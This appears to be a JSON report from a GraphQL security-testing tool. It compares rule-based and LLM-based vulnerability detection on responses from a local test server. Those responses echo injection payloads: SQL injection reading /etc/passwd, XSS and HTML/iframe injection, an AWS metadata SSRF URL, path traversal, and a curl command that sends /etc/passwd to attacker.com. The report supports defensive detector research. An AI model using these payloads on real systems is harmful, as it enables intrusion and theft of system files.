@@ -1,0 +1,819 @@
+{
+  "report_timestamp": "2025-10-08T20:36:10.649778",
+  "api_url": "http://localhost:4000/graphql",
+  "summary": {
+    "total_comparisons": 10,
+    "agreement_rate": 0.5,
+    "simple_detections": 6,
+    "llm_detections": 7,
+    "consensus_breakdown": {
+      "both_detected": 6,
+      "llm_only": 1,
+      "no_vulnerabilities": 3
+    },
+    "detection_ratio": 1.1666666666666667,
+    "potential_analysis": {
+      "potential_agreement_rate": 0.0,
+      "simple_potential_detections": 5,
+      "llm_potential_detections": 1,
+      "potential_consensus_breakdown": {
+        "simple_potential_only": 5,
+        "no_potential": 4,
+        "llm_potential_only": 1
+      },
+      "potential_detection_ratio": 0.2
+    }
+  },
+  "detailed_comparisons": [
+    {
+      "timestamp": "2025-10-08T20:33:06.852351",
+      "node_name": "updateCurrency_response_2",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updateCurrency": {
+            "id": "afa3696c-153b-4126-9f57-dc74ef732d3b",
+            "abbreviation": "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- "
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "SQL Injection (SQLi) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
+            "evidence": "Response status: 200, SQL patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: sql_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains a SQL injection payload in the 'abbreviation' field: `UNION SELECT` coupled with `LOAD_FILE('/etc/passwd')` indicates an attempt to append and execute a database query to read the system's /etc/passwd file. The successful 200 status code suggests the payload was not properly sanitized and may have executed, exposing potential SQL injection vulnerability via GraphQL input parameters.",
+            "evidence": "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- ",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "sql_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- ",
+              "explanation": "The response contains a SQL injection payload in the 'abbreviation' field: `UNION SELECT` coupled with `LOAD_FILE('/etc/passwd')` indicates an attempt to append and execute a database query to read the system's /etc/passwd file. The successful 200 status code suggests the payload was not properly sanitized and may have executed, exposing potential SQL injection vulnerability via GraphQL input parameters."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:33:19.348061",
+      "node_name": "updateCurrency_response_3",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updateCurrency": {
+            "id": "30555ed8-aeff-4d2d-90f0-74fce6c8956c",
+            "country": "<img src=x onerror=alert(1)>"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Cross-Site Scripting (XSS) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
+            "evidence": "Response status: 200, XSS patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: xss_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains an HTML payload (`<img src=x onerror=alert(1)>`) in the 'country' field, which demonstrates a classic stored XSS vector. If this value is rendered unsanitized in a browser, it would execute arbitrary JavaScript (alert(1)). The 200 status code confirms the payload was accepted and persisted, indicating a high likelihood of successful exploitation when retrieved and displayed to users.",
+            "evidence": "\"country\": \"<img src=x onerror=alert(1)>\"",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "xss_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "\"country\": \"<img src=x onerror=alert(1)>\"",
+              "explanation": "The response contains an HTML payload (`<img src=x onerror=alert(1)>`) in the 'country' field, which demonstrates a classic stored XSS vector. If this value is rendered unsanitized in a browser, it would execute arbitrary JavaScript (alert(1)). The 200 status code confirms the payload was accepted and persisted, indicating a high likelihood of successful exploitation when retrieved and displayed to users."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:33:37.066028",
+      "node_name": "updateCurrency_response_4",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updateCurrency": {
+            "id": "de024047-7a14-4e07-b1ae-2a63901b8523",
+            "symbol": "http://169.254.169.254/latest/meta-data/"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SSRF injection vulnerability detected - internal network access patterns found",
+            "evidence": "Response status: 200, SSRF keywords detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: ssrf_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response includes the internal AWS metadata service URL (169.254.169.254) in the 'symbol' field. This IP address is a well-known target for SSRF attacks as it exposes cloud instance metadata, which often contains sensitive credentials. The presence of this URL suggests the server may have processed or stored an untrusted input that triggers internal network requests, a hallmark of SSRF vulnerabilities.",
+            "evidence": "http://169.254.169.254/latest/meta-data/ in 'symbol' field",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "ssrf_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "http://169.254.169.254/latest/meta-data/ in 'symbol' field",
+              "explanation": "The response includes the internal AWS metadata service URL (169.254.169.254) in the 'symbol' field. This IP address is a well-known target for SSRF attacks as it exposes cloud instance metadata, which often contains sensitive credentials. The presence of this URL suggests the server may have processed or stored an untrusted input that triggers internal network requests, a hallmark of SSRF vulnerabilities."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:33:51.809630",
+      "node_name": "updateCurrency_response_5",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updateCurrency": {
+            "id": "a5042a42-5d29-4aa9-9e4f-7e588fbeffe6",
+            "abbreviation": "; curl https://attacker.com/?exfil=$(cat /etc/passwd)|base64 -"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: os_command_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The 'abbreviation' field contains a payload with a command separator (;), a curl command to an external domain, and an attempt to exfiltrate /etc/passwd via command substitution and base64 encoding. This indicates an attempt to execute arbitrary OS commands via improper input sanitization in a GraphQL mutation, suggesting successful or attempted command injection.",
+            "evidence": "abbreviation: \"; curl https://attacker.com/?exfil=$(cat /etc/passwd)|base64 -\"",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "os_command_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "abbreviation: \"; curl https://attacker.com/?exfil=$(cat /etc/passwd)|base64 -\"",
+              "explanation": "The 'abbreviation' field contains a payload with a command separator (;), a curl command to an external domain, and an attempt to exfiltrate /etc/passwd via command substitution and base64 encoding. This indicates an attempt to execute arbitrary OS commands via improper input sanitization in a GraphQL mutation, suggesting successful or attempted command injection."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:34:08.369671",
+      "node_name": "updateCurrency_response_6",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updateCurrency": {
+            "id": "80829ab2-3206-4a6b-ae71-bb2055c12e8a",
+            "country": "../../../../../../etc/passwd%00"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Path Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "Path injection vulnerability detected - file system access patterns found",
+            "evidence": "Response status: 200, Path injection patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: path_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains a directory traversal payload (../../../../../../etc/passwd) with a null byte (%00) in the 'country' field. This is a strong indicator of path injection attempting to access sensitive system files like /etc/passwd. The null byte suggests an attempt to bypass file path validation, a common technique in path traversal attacks. The successful 200 response indicates the server may have processed this malicious input without proper sanitization.",
+            "evidence": "country: \"../../../../../../etc/passwd%00\"",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "path_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "country: \"../../../../../../etc/passwd%00\"",
+              "explanation": "The response contains a directory traversal payload (../../../../../../etc/passwd) with a null byte (%00) in the 'country' field. This is a strong indicator of path injection attempting to access sensitive system files like /etc/passwd. The null byte suggests an attempt to bypass file path validation, a common technique in path traversal attacks. The successful 200 response indicates the server may have processed this malicious input without proper sanitization."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:34:43.183847",
+      "node_name": "updateCurrency_response_7",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "updateCurrency": {
+            "id": "afa3696c-153b-4126-9f57-dc74ef732d3b",
+            "abbreviation": "<h1>Hacked</h1><iframe src='javascript:alert(1)'>"
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "HTML Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "HTML injection vulnerability detected - HTML markup found in response",
+            "evidence": "Response status: 200, HTML patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: html_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The response contains unsanitized HTML tags (`<h1>` and `<iframe>`) in the `abbreviation` field. If this value is rendered directly in a client's browser without proper escaping, it would execute the embedded HTML/JavaScript, enabling HTML Injection and potential XSS attacks. The presence of raw HTML markup in the API response indicates insufficient input sanitization/output encoding.",
+            "evidence": "abbreviation: \"<h1>Hacked</h1><iframe src='javascript:alert(1)'>\"",
+            "confidence": 0.9,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "html_injection",
+              "severity": "HIGH",
+              "confidence": 0.9,
+              "evidence": "abbreviation: \"<h1>Hacked</h1><iframe src='javascript:alert(1)'>\"",
+              "explanation": "The response contains unsanitized HTML tags (`<h1>` and `<iframe>`) in the `abbreviation` field. If this value is rendered directly in a client's browser without proper escaping, it would execute the embedded HTML/JavaScript, enabling HTML Injection and potential XSS attacks. The presence of raw HTML markup in the API response indicates insufficient input sanitization/output encoding."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:35:16.902449",
+      "node_name": "updateCurrency_response_8",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:35:33.216147",
+      "node_name": "updateCurrency_response_9",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:35:54.593633",
+      "node_name": "updateCurrency_response_10",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"updateCurrency\" on type \"Query\". Did you mean \"getCurrency\"?",
+            "locations": [
+              {
+                "line": 3,
+                "column": 3
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED",
+              "exception": {
+                "stacktrace": [
+                  "GraphQLError: Cannot query field \"updateCurrency\" on type \"Query\". Did you mean \"getCurrency\"?",
+                  "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                  "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                  "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                  "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                  "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                  "    at Generator.next (<anonymous>)",
+                  "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                  "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                ]
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-08T20:36:10.644604",
+      "node_name": "updateCurrency_response_11",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"updateCurrency\" on type \"Query\". Did you mean \"getCurrency\"?",
+            "locations": [
+              {
+                "line": 3,
+                "column": 3
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED",
+              "exception": {
+                "stacktrace": [
+                  "GraphQLError: Cannot query field \"updateCurrency\" on type \"Query\". Did you mean \"getCurrency\"?",
+                  "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                  "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                  "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                  "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                  "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                  "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                  "    at Generator.next (<anonymous>)",
+                  "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                  "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                ]
+              }
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Field Suggestions Enabled",
+            "detection": "vulnerable",
+            "category": "Information Disclosure",
+            "description": "Field suggestions enabled - potential information disclosure",
+            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Information Disclosure"
+        ],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: field_suggestions",
+            "detection": "potential",
+            "category": "Unknown",
+            "description": "The server's error response explicitly suggests a valid field (getCurrency) when an invalid one (updateCurrency) is requested. This reveals schema structure through error messages, enabling attackers to discover valid fields via brute-force/typo attacks. While not critical, this information disclosure aids attackers in mapping the API surface.",
+            "evidence": "Error message contains \"Did you mean \\\"getCurrency\\\"?\" suggestion",
+            "confidence": 0.8,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "field_suggestions",
+              "severity": "MEDIUM",
+              "confidence": 0.8,
+              "evidence": "Error message contains \"Did you mean \\\"getCurrency\\\"?\" suggestion",
+              "explanation": "The server's error response explicitly suggests a valid field (getCurrency) when an invalid one (updateCurrency) is requested. This reveals schema structure through error messages, enabling attackers to discover valid fields via brute-force/typo attacks. While not critical, this information disclosure aids attackers in mapping the API surface."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Unknown"
+        ],
+        "potential_categories": [
+          "Unknown"
+        ]
+      },
+      "comparison": {
+        "total_categories": [
+          "Information Disclosure",
+          "Unknown"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Information Disclosure"
+        ],
+        "llm_unique_categories": [
+          "Unknown"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Unknown"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [
+            "Unknown"
+          ],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "llm_potential_only"
+        }
+      }
+    }
+  ],
+  "detector_analysis": {
+    "simple_detector": {
+      "description": "Rule-based detector using predefined patterns",
+      "strengths": [
+        "Fast execution",
+        "Consistent results",
+        "Low resource usage"
+      ],
+      "weaknesses": [
+        "Limited to known patterns",
+        "May miss novel attacks",
+        "False negatives possible"
+      ]
+    },
+    "llm_detector": {
+      "description": "AI-powered detector using language model analysis",
+      "strengths": [
+        "Contextual understanding",
+        "Novel attack detection",
+        "Detailed analysis"
+      ],
+      "weaknesses": [
+        "Slower execution",
+        "Resource intensive",
+        "Potential false positives"
+      ]
+    }
+  }
+}
